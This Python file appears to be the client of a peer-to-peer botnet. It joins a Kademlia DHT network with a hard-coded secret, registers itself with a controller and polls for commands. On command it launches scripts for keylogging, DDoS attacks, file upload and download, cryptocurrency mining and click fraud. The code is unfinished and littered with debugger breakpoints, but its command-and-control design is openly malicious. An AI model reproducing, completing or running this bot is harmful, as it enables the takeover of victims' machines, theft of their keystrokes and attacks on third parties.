import logging, sys, pdb
import asyncio, subprocess, hashlib, socket
from asyncio.tasks import ensure_future
from kademlia.network import Server
from collections import Counter

SECRET="TheSecretKey"

handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)


loop = asyncio.get_event_loop()
loop.set_debug(True)   

if len(sys.argv) != 4:
    print("Usage: python botnet_updated.py <bootstrap ip> <bootstrap port> <bot port>")
    exit(0)
bootstrap_ip = str(sys.argv[1])
port = int(sys.argv[2])
myport = int(sys.argv[3])

class botnode:
    def __init__(self, ip, port, network_id, idhash):
        self.ip = ip
        self.port = port
        self.id = network_id
        self.cmdcnt = 0
        # this will store all the child processes that are started
        self.pgroup = []
        self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                        'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
                        'CLICKFRAUD': False}
        # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
        self.cmdkey = idhash

def get_ip_address():
    ## Attempts to Connects to WAN and gets ip address of socket that connected
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))
    return s.getsockname()[0]

def get_hash(prehash):
    m = hashlib.sha1()
    m.update(prehash.encode('utf-8'))
    return m.hexdigest()

def most_common(list):
    data = Counter(list)
    return data.most_common(1)[0][0]

async def get_cmd(value, server, bot):
    commands = ['DDOS', 'DOWNLOAD', 'KEYLOG', 'UPLOAD', 'BITCOIN', 'CLICKFRAUD']
    try:
        x = value.split()
        cnt = int(x[0])  # parse out the command count
        cmd = x[1]
        if cmd in commands and cnt > bot.cmdcnt:
            bot.cmdcnt += 1
            if cmd == 'KEYLOG':
                if bot.cmdsrun['KEYLOG'] is False:
                    tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
                    print("Starting keylogger")
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot.pgroup.append(process)
                    bot.cmdsrun['KEYLOG'] = True
            if cmd == 'DDOS':
                if bot.cmdsrun['DDOS'] is False:
                    tmp = 'python ddos.py {0}'.format(' '.join(x[1:]))
                    print("Starting DDOS on {0}".format(tmp))
                    process = subprocess.Popen(tmp.split(), shell=False)
                    bot.cmdsrun['DDOS'] = True
            if cmd == 'UPLOAD':
                tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
                print("Starting upload on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)

            if cmd == 'DOWNLOAD':
                tmp = 'python download.py {0}'.format(' '.join(x[1:]))
                print("Starting DOWNLOAD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == 'BITCOIN':
                tmp = 'python mine.py {0}'.format(' '.join(x[1:]))
                print("Starting BITCOING MINING on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
            if cmd == 'CLICKFRAUD':
                tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
                print("Starting CLICKFRAUD on {0}".format(tmp))
                process = subprocess.Popen(tmp.split(), shell=False)
    except Exception as e:
        pass
    #pdb.set_trace()
    await wait_cmd(server, bot)


async def wait_cmd(server, bot):
    print("Checking for command")
    pdb.set_trace()
    loop.call_soon_threadsafe(get_cmd(server.get(bot.cmdkey), server,bot)) #.addCallback(get_cmd, server, bot))
    asyncio.sleep(5)

async def ack_valid(value, server, bot):
    # t = hashlib.sha1().update('ack')
    if value != str(bot.id):
        await callhome(server, bot)
        print("no ack")
    else:
        print("ack")
        pdb.set_trace()
        await(wait_cmd(server, bot))
        asyncio.sleep(5)
        #cmdloop.start(5)
        # wait_cmd(None,server,bot)

async def check_ack(result, server, bot):
    mykey = hashlib.sha1()
    mykey.update(bot.id.encode('utf-8'))
    idValue = await server.get(mykey.hexdigest()) #keyhash
    print("\nKey {}\nServerID: {}\n\n".format(mykey.hexdigest(),idValue)) #keyhash
    #pdb.set_trace()
    #await ack_valid(idValue, server,bot)
    #ensure_future(ack_valid(server,bot))
    

async def callhome(server, bot):
    ##NOTE KEY initialized at start of loop, no need to create here
    #key = hashlib.sha1() 
    #key.update(SECRET.encode('utf-8'))
    
    # announce to Shepard that we exist, then check for ack
    result = await server.set(keyhash, str(bot.id))
    print("\nResult of joining network: {}\n{}\n\n".format(result, type(result)))
    #pdb.set_trace()
    await check_ack(result, server, bot)




##TODO: Confirm if idhash == network key, confirm from debug traces looks like NodeID might be getting set as KEY on network. 
async def setup(server):
    # check that it got a result back
    # print str(server.node.long_id)
    #Pull IP address from hostname of node #NOTE: This would be LAN IP and not WAN IP, can adjust code to reflect change if needed
    myip = get_ip_address()
    idhash = get_hash(str(server.node.long_id)) 
    #Create botNodes with Its IP, Port, Network Key (hashed), and Value (UUID)
    bot = botnode(myip, port, str(server.node.long_id), idhash)

    print("\nParams: NETWORK_KEY {}\nIP: {}\nNODE_ID: {}\nHASHED VALUE USED TO ID MACHINE ON NET: {}".format(keyhash, myip, server.node.long_id, idhash))
    print("\nBOT CREATED? CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
    #pdb.set_trace()
    
    await callhome(server, bot)


### IF check does nothing server returning NoneType, bc Node has not yet joined network. 
async def bootstrapDone(server, key):
    result = await server.get(key)
    if result is None:
        print("\nKey is: ",result, type(result), "\n\nMoving to setup() machine has not joined network before\n")
        await setup(server)
    else:
        print("\nAble to fetch key as result:",result, type(result))
    



#SERVER ACTUALLY STARTS HERE*****************************************
server = Server()
#### KEY TO JOIN NETWORK ####
key = hashlib.sha1()
key.update(SECRET.encode('utf-8'))
keyhash = key.hexdigest()

loop.run_until_complete(server.listen(myport))
loop.run_until_complete(server.bootstrap([(bootstrap_ip, port)]))
asyncio.sleep(5)
#loop.run_until_complete(bootstrapDone(server, key))
pdb.set_trace()
try:
    loop.run_until_complete(bootstrapDone(server,key))
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    server.stop()
    loop.close()